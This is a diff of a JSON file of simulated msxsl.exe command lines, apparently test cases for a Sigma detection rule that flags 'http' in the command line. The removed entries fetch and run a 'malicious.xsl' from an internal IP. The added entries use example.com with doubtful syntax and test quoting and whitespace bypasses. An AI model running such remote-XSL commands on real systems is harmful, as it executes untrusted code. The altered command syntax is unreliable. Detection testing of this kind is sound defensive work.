@@ -1,18 +1,22 @@
 [
   {
-    "output": "msxsl.exe local.xml http://10.0.0.5/malicious.xsl",
-    "explanation": "The original command uses a UNC path, but the Sigma rule detects the use of 'http' in the command line. This simulated command replaces the UNC path with an HTTP URL to trigger the rule."
+    "output": "msxsl.exe -http://example.com/file.xsl",
+    "explanation": "This command simulates a remote XSL execution via msxsl.exe using a URL containing 'http', which matches the Sigma rule's detection criteria."
   },
   {
-    "output": "msxsl.exe local.xml http://10.0.0.5/malicious.xsl -xsl:",
-    "explanation": "This command includes an explicit '-xsl' flag to specify the XSL file, which is valid syntax for msxsl.exe and still includes the 'http' keyword to trigger the Sigma rule."
+    "output": "msxsl.exe -\"http://example.com/file.xsl\"",
+    "explanation": "Quotes are inserted around the URL to test parsing behavior, but the 'http' keyword is still present and detectable."
   },
   {
-    "output": "msxsl.exe local.xml \"http://10.0.0.5/malicious.xsl\"",
-    "explanation": "Quotes are inserted around the URL using insertion technique. The command remains valid and still includes the 'http' keyword to trigger the Sigma rule."
+    "output": "msxsl.exe -http://example.com/file.xsl -somethingElse",
+    "explanation": "Additional arguments are appended to simulate realistic command-line usage while maintaining the presence of 'http'."
   },
   {
-    "output": "msxsl.exe local.xml http://10.0.0.5/malicious.xsl -o output.xml",
-    "explanation": "An additional '-o' flag is added to specify an output file. This is valid syntax and does not affect the detection based on the presence of 'http' in the command line."
+    "output": "msxsl.exe -http://example.com/file.xsl ",
+    "explanation": "Trailing space is added after the command line to test for whitespace-based bypasses, but the 'http' keyword remains detectable."
+  },
+  {
+    "output": "msxsl.exe -http://example.com/file.xsl",
+    "explanation": "The command is unchanged but included to confirm the baseline detection behavior of the Sigma rule."
   }
 ]
